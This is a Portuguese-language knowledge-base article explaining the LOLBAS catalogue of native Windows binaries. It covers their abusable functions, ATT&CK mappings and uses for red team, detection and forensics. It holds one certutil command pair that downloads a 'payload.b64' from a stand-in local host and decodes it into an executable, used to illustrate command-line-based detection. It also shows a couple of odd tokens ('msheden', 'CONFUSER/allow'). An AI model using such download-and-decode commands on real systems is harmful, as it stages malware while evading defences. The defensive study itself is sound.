---
slug: own-lolbas-metodologia
title: "LOLBAS: binários nativos do Windows como ferramenta de ataque"
category: windows-privesc
summary: "O que o LOLBAS cataloga, quais funções ele reconhece, como cruzar com o ATT&CK e por que a ausência de um binário malicioso não significa ausência de atividade."
tags: "lolbas windows living-off-the-land attck powershell privesc"
severity: medium
references:
  - LOLBAS — projeto original | https://lolbas-project.github.io/
  - LOLBAS — critérios e README | https://github.com/LOLBAS-Project/LOLBAS/blob/master/README.md
  - LOLBAS — página da API | https://lolbas-project.github.io/api/
  - LOLBAS — camada do ATT&CK Navigator | https://github.com/LOLBAS-Project/LOLBAS/blob/master/README.md
  - LOLDrivers - drivers vulneráveis | https://www.loldrivers.io/
---

LOLBAS significa *Living Off The Land Binaries, Scripts and Libraries*. O projeto
cataloga binários, scripts e bibliotecas que **já vêm instalados no Windows**
(Microsoft ou componentes do sistema) e que podem ser usados para executar,
baixar, copiar, decodificar, persistir ou despejar memória sem trazer um
executável novo para o sistema.

O README do projeto define critérios explícitos para aceitar uma entrada. Não é
qualquer utilitário: em geral precisa ser um binário Microsoft assinado,
presente por padrão (ou componente instalável documentado), e a função
documentada precisa ser **não documentada como API pública** ou ser um efeito
colateral de uma função legítima. O projeto mantém uma lista de critérios e
rejeita entradas que não os cumprem — por isso é uma fonte com curadoria, não um
dump.

## As categorias de função

Na página principal, cada binário lista as funções. As categorias que importam na
prática de pentest Windows:

| Função | Uso típico |
| --- | --- |
| `Execute` | rodar código (EXE, DLL, CMD, PowerShell, COM, MSI, XSL, .NET) |
| `Download` | baixar arquivo sem um cliente HTTP comum |
| `Upload` | exfiltrar arquivo para fora |
| `Copy` | copiar arquivo, inclusive contornando bloqueio por extensão |
| `Alternate data streams` (ADS) | esconder conteúdo em fluxo alternativo NTFS |
| `AWL bypass` | contornar "application allow list" |
| `Compile` | compilar código no host (`csc`, `ilasm`, `jsc`, `vbc`) |
| `UAC bypass` | contornar o UAC com binário assinado |
| `Dump` | despejar memória ou hives |
| `Credentials` | obter credenciais |
| `Tamper` | desabilitar proteção, apagar logs, desativar antivírus |
| `Conceal` | esconder artefatos |
| `Reconnaissance` | coletar informações |

Cada entrada vem com a técnica **MITRE ATT&CK** correspondente. O projeto publica
uma camada para o ATT&CK Navigator, o que permite ver o mapa de técnicas
cobertas. Exemplos de mapeamento que aparecem na própria página:

- `certutil.exe` → `T1105` (Ingress Tool Transfer), `T1564.004` (ADS),
  `T1027.013` (Encoded/Compressed File), `T1140` (Deobfuscate/Decode);
- `rundll32.exe` → `T1218.011` (System Binary Proxy Execution: Rundll32);
- `regsvr32.exe` → `T1218.010` (Regsvr32);
- `msheden`/`mshta.exe` → `T1218.005` (Mshta);
- `wmic.exe` → `T1047` (Windows Management Instrumentation);
- `schtasks.exe` → `T1053.005` (Scheduled Task);
- `comsvcs.dll` (via `rundll32`) → `T1003.001` (LSASS Memory).

## Por que isso importa na análise defensiva

Um EDR moderno detecta execução de binário **desconhecido** com facilidade. Um
binário assinado pela Microsoft, rodando de `C:\Windows\System32`, é uma
anomalia muito menos óbvia. Por isso o LOLBAS é útil em três frentes:

1. **Pentest/red team:** teste se as proteções (AppLocker, WDAC, ASR rules)
   bloqueiam a função, não só a extensão do arquivo.
2. **Blue team:** use a lista como base de detecção. Cada entrada tem
   argumentos concretos que podem ser convertidos em regra de log ou de YARA.
3. **DFIR:** quando um processo parece legítimo, a linha de comando é o
   indicador, não o nome do processo.

Exemplo clássico de decodificação com `certutil`:

```cmd
certutil -urlcache -split -f http://127.0.0.1/payload.b64 payload.b64
certutil -decode payload.b64 payload.exe
```

O `certutil` é um utilitário legítimo de certificados; esses flags fazem ele
baixar e decodificar. A detecção correta é pela linha de comando (`urlcache`,
`-decode`, `-split`) e não pela simples execução do `certutil`.

## Como usar com método

**Enumerar o ambiente antes.** O AppLocker/WDAC pode restringir quais binários
rodam. `Get-AppLockerPolicy -Effective` mostra a política em vigor. Rodar um
binário da lista que está bloqueado não prova nada além de que está bloqueado.

**Testar a função, não a existência.** `mshta.exe` existir no sistema não
significa que ele executa HTA de origem remota: a política de zona, o Mark of the
Web e a política de ASR mudam o resultado.

**Separar o que é bypass de allow list do que é execução normal.** Muitas
entradas existem porque o binário é de system32 e roda como CONFUSER/allow.
Numa máquina sem AppLocker, a entrada não muda nada.

**Registrar a linha de comando completa** na evidência. É o artefato que
sobrevive (Event ID 4688, 4104 do PowerShell, EDR telemetry).

## Limites e armadilhas

- O LOLBAS não lista *drivers*: esse catálogo é o LOLDrivers, projeto separado.
- Não é uma coleção de exploits. Entradas não significam falha de segurança no
  binário; significam função abusável.
- A lista de binários "OtherMSBinaries" inclui itens de Office/Visual Studio que
  podem não existir na máquina alvo. Verifique a presença antes de planejar.
- `bash.exe` e `wsl.exe` aparecem porque o subsistema Linux opcional é parte do
  Windows moderno — presença indicam que o WSL está instalado, não que o
  Windows está inseguro.

## O que este documento não cobre

Detalhe técnico de cada binário (o site é a fonte viva), técnicas de evasão de
EDR de terceiros, e engenharia de payload — para isso existem trilhas próprias.